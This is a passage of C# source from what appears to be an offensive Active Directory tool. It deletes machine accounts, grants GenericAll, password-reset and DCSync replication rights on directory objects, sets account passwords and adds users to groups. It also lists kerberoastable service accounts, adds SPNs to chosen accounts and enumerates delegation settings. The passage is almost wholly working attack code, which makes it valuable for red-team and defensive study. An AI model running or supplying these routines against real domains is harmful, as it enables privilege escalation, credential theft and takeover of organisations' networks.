                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);
                    try
                    {
                        sr.GetDirectoryEntry().DeleteTree();
                        Console.WriteLine("\n[+] Machine account deleted from AD");
                    }
                    catch
                    {
                        Console.WriteLine("\n[!] Failed to delete machine account..");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to resolve domain object..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void getObjectAccessPermissions(String sObject, String sNTAccount = "", String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = sObject;

            try
            {
                // Search
                SearchResultCollection oMachine = ds.FindAll();

                // Did we get 1 result back?
                if (oMachine.Count == 0)
                {
                    Console.WriteLine("[!] Object not found..");
                    return;
                }
                else if (oMachine.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get machine details
                foreach (SearchResult sr in oMachine)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);
                    try
                    {
                        Console.WriteLine("\n[+] Object properties");
                        Console.WriteLine("    |_ Owner : " + mde.ObjectSecurity.GetOwner(typeof(NTAccount)).ToString());
                        Console.WriteLine("    |_ Group : " + mde.ObjectSecurity.GetGroup(typeof(NTAccount)).ToString());

                        AuthorizationRuleCollection arc = mde.ObjectSecurity.GetAccessRules(true, true, typeof(NTAccount));
                        Console.WriteLine("\n[+] Object access rules");
                        foreach (ActiveDirectoryAccessRule ar in arc)
                        {
                            if (ar.IdentityReference.Value == sNTAccount || String.IsNullOrEmpty(sNTAccount))
                            {
                                Console.WriteLine("\n[+] Identity --> " + ar.IdentityReference.Value);
                                Console.WriteLine("    |_ Type       : " + ar.AccessControlType.ToString());
                                Console.WriteLine("    |_ Permission : " + ar.ActiveDirectoryRights.ToString());
                                if (ar.ObjectType.ToString() == "00000000-0000-0000-0000-000000000000")
                                {
                                    Console.WriteLine("    |_ Object     : ANY");
                                }
                                else
                                {
                                    String sSchemaFriendlyName = hStandIn.schemaGUIDToFriendlyName(ar.ObjectType, sDomain, sUser, sPass);
                                    if (String.IsNullOrEmpty(sSchemaFriendlyName))
                                    {
                                        String sRightsFriendlyName = hStandIn.rightsGUIDToFriendlyName(ar.ObjectType, sDomain, sUser, sPass);
                                        if (String.IsNullOrEmpty(sRightsFriendlyName))
                                        {
                                            Console.WriteLine("    |_ Object     : " + ar.ObjectType.ToString());
                                        }
                                        else
                                        {
                                            Console.WriteLine("    |_ Object     : " + sRightsFriendlyName);
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine("    |_ Object     : " + sSchemaFriendlyName);
                                    }
                                }
                            }
                        }
                    } catch
                    {
                        Console.WriteLine("[!] Failed to resolve object access properties..");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to resolve domain object..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void grantObjectAccessPermissions(String sObject, hStandIn.AccessRequest oAccess, String sGUID, String sNTAccount, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = sObject;

            try
            {
                // Search
                SearchResultCollection oMachine = ds.FindAll();

                // Did we get 1 result back?
                if (oMachine.Count == 0)
                {
                    Console.WriteLine("[!] Object not found..");
                    return;
                }
                else if (oMachine.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get machine details
                foreach (SearchResult sr in oMachine)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);
                    try
                    {
                        Console.WriteLine("\n[+] Object properties");
                        Console.WriteLine("    |_ Owner : " + mde.ObjectSecurity.GetOwner(typeof(NTAccount)).ToString());
                        Console.WriteLine("    |_ Group : " + mde.ObjectSecurity.GetGroup(typeof(NTAccount)).ToString());
                        Console.WriteLine("\n[+] Set object access rules");
                        IdentityReference ir = new NTAccount(sNTAccount);

                        if (oAccess == hStandIn.AccessRequest.genericall)
                        {
                            ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.GenericAll, AccessControlType.Allow, ActiveDirectorySecurityInheritance.None);
                            mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                            mde.ObjectSecurity.AddAccessRule(ar);
                        } else if (oAccess == hStandIn.AccessRequest.genericwrite)
                        {
                            ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.GenericWrite, AccessControlType.Allow, ActiveDirectorySecurityInheritance.None);
                            mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                            mde.ObjectSecurity.AddAccessRule(ar);
                        } else if (oAccess == hStandIn.AccessRequest.resetpassword)
                        {
                            Guid rightGuid = new Guid("00299570-246d-11d0-a768-00aa006e0529"); // User-Force-Change-Password
                            ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, rightGuid, ActiveDirectorySecurityInheritance.None);
                            mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                            mde.ObjectSecurity.AddAccessRule(ar);
                        } else if (oAccess == hStandIn.AccessRequest.writemembers)
                        {
                            Guid rightGuid = new Guid("bf9679c0-0de6-11d0-a285-00aa003049e2"); // Member
                            ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, rightGuid, ActiveDirectorySecurityInheritance.None);
                            mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                            mde.ObjectSecurity.AddAccessRule(ar);
                        } else if (oAccess == hStandIn.AccessRequest.dcsync)
                        {
                            Guid rightGuid = new Guid("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"); // DS-Replication-Get-Change
                            ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, rightGuid, ActiveDirectorySecurityInheritance.None);
                            mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                            mde.ObjectSecurity.AddAccessRule(ar);

                            rightGuid = new Guid("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"); // DS-Replication-Get-Changes-All
                            ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, rightGuid, ActiveDirectorySecurityInheritance.None);
                            mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                            mde.ObjectSecurity.AddAccessRule(ar);

                            rightGuid = new Guid("89e95b76-444d-4c62-991a-0facbeda640c"); // DS-Replication-Get-Changes-In-Filtered-Set
                            ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, rightGuid, ActiveDirectorySecurityInheritance.None);
                            mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                            mde.ObjectSecurity.AddAccessRule(ar);
                        } else if (!String.IsNullOrEmpty(sGUID))
                        {
                            Guid rightGuid = new Guid(sGUID); // Custom rights guid
                            ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, rightGuid, ActiveDirectorySecurityInheritance.None);
                            mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                            mde.ObjectSecurity.AddAccessRule(ar);
                        }

                        mde.CommitChanges();
                        if (Enum.GetName(typeof(hStandIn.AccessRequest), oAccess) != "none")
                        {
                            Console.WriteLine("    |_ Success, added " + Enum.GetName(typeof(hStandIn.AccessRequest), oAccess) + " privileges to object for " + sNTAccount);
                        } else
                        {
                            Console.WriteLine("    |_ Success, added GUID rights privilege to object for " + sNTAccount);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to set object access properties..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to resolve domain object..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void setAccountPassword(String sObject, String sNewPass, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = sObject;

            try
            {
                // Search
                SearchResultCollection oMachine = ds.FindAll();

                // Did we get 1 result back?
                if (oMachine.Count == 0)
                {
                    Console.WriteLine("[!] Object not found..");
                    return;
                }
                else if (oMachine.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get machine details
                foreach (SearchResult sr in oMachine)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);
                    try
                    {
                        Console.WriteLine("\n[+] Object properties");
                        Console.WriteLine("    |_ Owner : " + mde.ObjectSecurity.GetOwner(typeof(NTAccount)).ToString());
                        Console.WriteLine("    |_ Group : " + mde.ObjectSecurity.GetGroup(typeof(NTAccount)).ToString());

                        Console.WriteLine("\n[+] Setting account password");
                        mde.Invoke("SetPassword", new object[] { sNewPass });
                        mde.CommitChanges();
                        Console.WriteLine("    |_ Success, password set for object");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to set object password..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to resolve domain object..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void addUserToGroup(String sGroup, String sAddUser, String sDomain = "", String sUser = "", String sPass = "")
        {
            try
            {
                PrincipalContext pc = null;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    String sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    pc = new PrincipalContext(ContextType.Domain, sDomain, sUser, sPass);
                }
                else
                {
                    pc = new PrincipalContext(ContextType.Domain);
                }

                Console.WriteLine("\n[?] Using DC : " + pc.ConnectedServer);

                GroupPrincipal oGroup = GroupPrincipal.FindByIdentity(pc, sGroup);
                Console.WriteLine("[?] Group    : " + oGroup.Name);
                Console.WriteLine("    GUID     : " + oGroup.Guid.ToString());
                if (oGroup == null)
                {
                    Console.WriteLine("[!] Failed to resolve group..");
                } else
                {
                    Console.WriteLine("\n[+] Adding user to group");
                    oGroup.Members.Add(pc, IdentityType.SamAccountName, sAddUser);
                    oGroup.Save();
                    Console.WriteLine("    |_ Success");
                }
            } catch (Exception ex)
            {
                Console.WriteLine("[!] Failed add user to group..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void removeUserFromGroup(String sGroup, String sRmUser, String sDomain = "", String sUser = "", String sPass = "")
        {
            try
            {
                PrincipalContext pc = null;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    String sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    pc = new PrincipalContext(ContextType.Domain, sDomain, sUser, sPass);
                }
                else
                {
                    pc = new PrincipalContext(ContextType.Domain);
                }

                Console.WriteLine("\n[?] Using DC : " + pc.ConnectedServer);

                GroupPrincipal oGroup = GroupPrincipal.FindByIdentity(pc, sGroup);
                Console.WriteLine("[?] Group    : " + oGroup.Name);
                Console.WriteLine("    GUID     : " + oGroup.Guid.ToString());
                if (oGroup == null)
                {
                    Console.WriteLine("[!] Failed to resolve group..");
                }
                else
                {
                    Console.WriteLine("\n[+] Removing user from group");
                    if (oGroup.Members.Contains(pc, IdentityType.SamAccountName, sRmUser))
                    {
                        oGroup.Members.Remove(pc, IdentityType.SamAccountName, sRmUser);
                    } else
                    {
                        Console.WriteLine("[!] User not in specified group..");
                        return;
                    }
                    oGroup.Save();
                    Console.WriteLine("    |_ Success");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed remove user from group..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void getGroupMembership(String sGroup, String sDomain = "", String sUser = "", String sPass = "")
        {
            try
            {
                PrincipalContext pc = null;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    String sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    pc = new PrincipalContext(ContextType.Domain, sDomain, sUser, sPass);
                }
                else
                {
                    pc = new PrincipalContext(ContextType.Domain);
                }

                Console.WriteLine("\n[?] Using DC : " + pc.ConnectedServer);
                GroupPrincipal oGroup = null;
                UserPrincipal oUser = null;
                try
                {
                    oGroup = GroupPrincipal.FindByIdentity(pc, sGroup);
                    oUser = UserPrincipal.FindByIdentity(pc, IdentityType.SamAccountName, sGroup);
                } catch { }
                if (oGroup != null)
                {
                    Console.WriteLine("[?] Type     : Group resolution");
                    Console.WriteLine("    Group    : " + oGroup.Name);
                    Console.WriteLine("\n[+] Members");
                    PrincipalCollection gms = oGroup.Members;

                    foreach (Principal m in gms)
                    {
                        DirectoryEntry mde = (DirectoryEntry)m.GetUnderlyingObject();
                        Console.WriteLine("\n[?] Path           : " + mde.Path);
                        Console.WriteLine("    samAccountName : " + m.SamAccountName);
                        if ((Int32)mde.Properties["samaccounttype"].Value == (Int32)hStandIn.SAM_ACCOUNT_TYPE.SAM_GROUP_OBJECT)
                        {
                            Console.WriteLine("    Type           : SAM_GROUP_OBJECT");
                        }
                        else if ((Int32)mde.Properties["samaccounttype"].Value == (Int32)hStandIn.SAM_ACCOUNT_TYPE.SAM_USER_OBJECT)
                        {
                            Console.WriteLine("    Type           : SAM_USER_OBJECT");
                        }
                        else
                        {
                            Console.WriteLine("    Type           : " + mde.Properties["samaccounttype"].Value);
                        }
                        Console.WriteLine("    SID            : " + m.Sid);

                    }
                } else if (oUser != null)
                {
                    Console.WriteLine("[?] Type     : User resolution");
                    Console.WriteLine("    User     : " + oUser.Name);
                    Console.WriteLine("\n[+] Memberships");
                    PrincipalSearchResult<Principal> groups = oUser.GetGroups();
                    foreach (GroupPrincipal g in groups)
                    {
                        DirectoryEntry mde = (DirectoryEntry)g.GetUnderlyingObject();
                        Console.WriteLine("\n[?] Path           : " + mde.Path);
                        Console.WriteLine("    samAccountName : " + g.SamAccountName);
                        Console.WriteLine("    Type           : SAM_GROUP_OBJECT");
                        Console.WriteLine("    SID            : " + g.Sid);
                    }
                } else
                {
                    Console.WriteLine("[!] Failed to resolve identity..");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate identity memberships..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void getSPNAccounts(String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();
                Console.WriteLine("[?] Found " + oObject.Count + " kerberostable users..");

                // Account details
                foreach (SearchResult sr in oObject)
                {
                    try
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        ResultPropertyCollection omProps = sr.Properties;

                        Console.WriteLine("\n[*] SamAccountName         : " + omProps["samAccountName"][0].ToString());
                        Console.WriteLine("    DistinguishedName      : " + omProps["distinguishedName"][0].ToString());
                        if (omProps["servicePrincipalName"].Count > 1)
                        {
                            List<String> servicePrincipalName = new List<String>();
                            
                            foreach (var element in omProps["servicePrincipalName"])
                            {
                                servicePrincipalName.Add(element.ToString());
                            }
                            Console.WriteLine("    ServicePrincipalName   : " + String.Join("\n                             ", servicePrincipalName.ToArray()));
                        }
                        else
                        {
                            Console.WriteLine("    ServicePrincipalName   : " + omProps["servicePrincipalName"][0].ToString());

                        }

                        long lastPwdSet = 0;
                        try
                        {
                            lastPwdSet = (long)omProps["pwdlastset"][0];
                        } catch { }
                        if (lastPwdSet == long.MaxValue)
                        {
                            Console.WriteLine("    PwdLastSet             : 0x7FFFFFFFFFFFFFFF");
                        }
                        else if (lastPwdSet == 0)
                        {
                            Console.WriteLine("    PwdLastSet             : 0x0");
                        }
                        else
                        {
                            Console.WriteLine("    PwdLastSet             : " + DateTime.FromFileTimeUtc((long)omProps["pwdlastset"][0]) + " UTC");
                        }
                        try
                        {
                            long logonTimestamp = (long)omProps["lastlogon"][0];
                            if (logonTimestamp == long.MaxValue)
                            {
                                Console.WriteLine("    lastlogon              : 0x7FFFFFFFFFFFFFFF");
                            }
                            else if (logonTimestamp == 0)
                            {
                                Console.WriteLine("    lastlogon              : 0x0");
                            }
                            else
                            {
                                Console.WriteLine("    lastlogon              : " + DateTime.FromFileTimeUtc((long)omProps["lastlogon"][0]) + " UTC");
                            }
                        } catch
                        {
                            try
                            {
                                long logonTimestamp = (long)omProps["lastlogontimestamp"][0];
                                if (logonTimestamp == long.MaxValue)
                                {
                                    Console.WriteLine("    lastlogontimestamp     : 0x7FFFFFFFFFFFFFFF");
                                }
                                else if (logonTimestamp == 0)
                                {
                                    Console.WriteLine("    lastlogontimestamp     : 0x0");
                                }
                                else
                                {
                                    Console.WriteLine("    lastlogontimestamp     : " + DateTime.FromFileTimeUtc((long)omProps["lastlogontimestamp"][0]) + " UTC");
                                }
                            } catch
                            {
                                Console.WriteLine("    lastlogontimestamp     : N/A");
                            }
                        }
                        hStandIn.SUPPORTED_ETYPE etypes = (hStandIn.SUPPORTED_ETYPE)0;
                        if (omProps.Contains("msDS-SupportedEncryptionTypes")) {
                            etypes = (hStandIn.SUPPORTED_ETYPE)omProps["msDS-SupportedEncryptionTypes"][0];
                        }
                        Console.WriteLine("    Supported ETypes       : " + etypes);
                    } catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to enumerate DirectoryEntry properties..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate SPN accounts..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void updateSPNProperty(String sSetSPN, String sPrincipal, Boolean bAdd = false, Boolean bRemove = false, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = "samaccountname=" + sSetSPN;

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("[!] Object not found..");
                    return;
                }
                else if (oObject.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get object details
                foreach (SearchResult sr in oObject)
                {
                    try
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        Console.WriteLine("[?] Object   : " + mde.Name);
                        Console.WriteLine("    Path     : " + mde.Path);

                        ResultPropertyCollection omProps = sr.Properties;
                        List<String> servicePrincipalName = new List<String>();
                        try
                        {
                            foreach (var element in omProps["servicePrincipalName"])
                            {
                                servicePrincipalName.Add(element.ToString());
                            }
                        }
                        catch
                        {
                            Console.WriteLine("[!] Failed to get servicePrincipalName property..");
                            return;
                        }

                        Console.WriteLine("\n[*] SamAccountName         : " + omProps["samAccountName"][0].ToString());
                        Console.WriteLine("    DistinguishedName      : " + omProps["distinguishedName"][0].ToString());
                        if (servicePrincipalName.Count > 0)
                        {
                            if (servicePrincipalName.Count > 1)
                            {
                                Console.WriteLine("    ServicePrincipalName   : " + String.Join("\n                             ", servicePrincipalName.ToArray()));
                            }
                            else
                            {
                                Console.WriteLine("    ServicePrincipalName   : " + omProps["servicePrincipalName"][0].ToString());
                            }
                        }
                        
                        if (!bRemove)
                        {
                            if (servicePrincipalName.Contains(sPrincipal))
                            {
                                Console.WriteLine("\n[!] ServicePrincipalName entry already exists..");
                                return;
                            }

                            Console.WriteLine("\n[+] Adding servicePrincipalName : " + sPrincipal);
                            servicePrincipalName.Add(sPrincipal);
                            mde.Properties["servicePrincipalName"].Value = (Array)servicePrincipalName.ToArray();
                        }
                        else
                        {
                            if (servicePrincipalName.Count == 0)
                            {
                                Console.WriteLine("\n[!] ServicePrincipalName property does not exist..");
                                return;
                            }

                            if (!servicePrincipalName.Contains(sPrincipal))
                            {
                                Console.WriteLine("\n[!] ServicePrincipalName entry does not exist..");
                                return;
                            }

                            Console.WriteLine("\n[+] Removing servicePrincipalName : " + sPrincipal);

                            servicePrincipalName.Remove(sPrincipal);
                            mde.Properties["servicePrincipalName"].Value = (Array)servicePrincipalName.ToArray();

                        }

                        mde.CommitChanges();
                        servicePrincipalName.Clear();
                        Console.WriteLine("    |_ Success");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to update servicePrincipalName..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to enumerate object properties..");
                return;
            }
        }

        public static void getDelegationAccounts(String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Unconstrained delegation filter
            ds.Filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();
                Console.WriteLine("\n[?] Found " + oObject.Count + " object(s) with unconstrained delegation..");

                // Account details
                foreach (SearchResult sr in oObject)
                {
                    try
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        ResultPropertyCollection omProps = sr.Properties;

                        Console.WriteLine("\n[*] SamAccountName           : " + omProps["samAccountName"][0].ToString());
                        Console.WriteLine("    DistinguishedName        : " + omProps["distinguishedName"][0].ToString());
                        Console.WriteLine("    userAccountControl       : " + (hStandIn.USER_ACCOUNT_CONTROL)omProps["useraccountcontrol"][0]);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to enumerate DirectoryEntry properties..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate accounts..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }

            // Constrained delegation filter
            ds.Filter = "(&(msDS-AllowedToDelegateTo=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();
                Console.WriteLine("\n[?] Found " + oObject.Count + " object(s) with constrained delegation..");

                // Account details
                foreach (SearchResult sr in oObject)
                {
                    try
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        ResultPropertyCollection omProps = sr.Properties;

                        Console.WriteLine("\n[*] SamAccountName           : " + omProps["samAccountName"][0].ToString());
                        Console.WriteLine("    DistinguishedName        : " + omProps["distinguishedName"][0].ToString());
                        UInt32 iDelegateCount = 0;
                        foreach (Object oColl in omProps["msds-allowedtodelegateto"])
                        {
                            if (iDelegateCount == 0)
                            {
                                Console.WriteLine("    msDS-AllowedToDelegateTo : " + oColl);
                            }
                            else
                            {
                                Console.WriteLine("                               " + oColl);
                            }
                            iDelegateCount += 1;
                        }
                        if (((Int32)mde.Properties["userAccountControl"].Value & (Int32)hStandIn.USER_ACCOUNT_CONTROL.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) != 0)
                        {
                            Console.WriteLine("    Protocol Transition      : True");
                        }
                        else
                        {
                            Console.WriteLine("    Protocol Transition      : False");
                        }
                        Console.WriteLine("    userAccountControl       : " + (hStandIn.USER_ACCOUNT_CONTROL)omProps["useraccountcontrol"][0]);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to enumerate DirectoryEntry properties..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate accounts..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }

            // Resource-Based Constrained delegation filter
            ds.Filter = "(&(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";

            // Enum  
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();
                Console.WriteLine("\n[?] Found " + oObject.Count + " object(s) with resource-based constrained delegation..");

                // For each account that has rbcd configured on it pointing to other objects
                foreach (SearchResult sr in oObject)
                {
                    try
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        ResultPropertyCollection omProps = sr.Properties;

                        Console.WriteLine("\n[*] SamAccountName           : " + omProps["samAccountName"][0].ToString());
                        Console.WriteLine("    DistinguishedName        : " + omProps["distinguishedName"][0].ToString());


                        String sFilter = "(&(|";
                        RawSecurityDescriptor rsd = new RawSecurityDescriptor((byte[])omProps["msDS-AllowedToActOnBehalfOfOtherIdentity"][0], 0);
                        // Get the ACE for each entry in the object's DACL, each of which points to an object that has inbound RBCD privileges.
                        foreach (CommonAce ace in rsd.DiscretionaryAcl)
                        {
                            sFilter = sFilter + "(objectSid=" + ace.SecurityIdentifier.ToString() + ")";
                        }
                        sFilter = sFilter + ")(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";

                        ds.Filter = sFilter;
                        SearchResultCollection delegationObjs = ds.FindAll();

                        UInt32 iDelegateCount = 0;
                        // Parse the results of the search query to get for each object that has inbound RBCD privileges on the current object.
                        foreach (SearchResult delegationObj in delegationObjs)
                        {
                            ResultPropertyCollection srProps = delegationObj.Properties;
                            if (iDelegateCount == 0)
                            {
                                if (srProps.Contains("grouptype"))
                                {
                                    Console.WriteLine("    Inbound Delegation       : " + srProps["samAccountName"][0].ToString() + " [GROUP]");
                                } else
                                {
                                    Console.WriteLine("    Inbound Delegation       : " + srProps["samAccountName"][0].ToString());
                                }
                            }
                            else
                            {
                                if (srProps.Contains("grouptype"))
                                {
                                    Console.WriteLine("                               " + srProps["samAccountName"][0].ToString() + " [GROUP]");
                                }
                                else
                                {
                                    Console.WriteLine("                               " + srProps["samAccountName"][0].ToString());
                                }
                            }
                            iDelegateCount += 1;
                        }
                        Console.WriteLine("    userAccountControl       : " + (hStandIn.USER_ACCOUNT_CONTROL)omProps["useraccountcontrol"][0]);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to enumerate DirectoryEntry properties..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
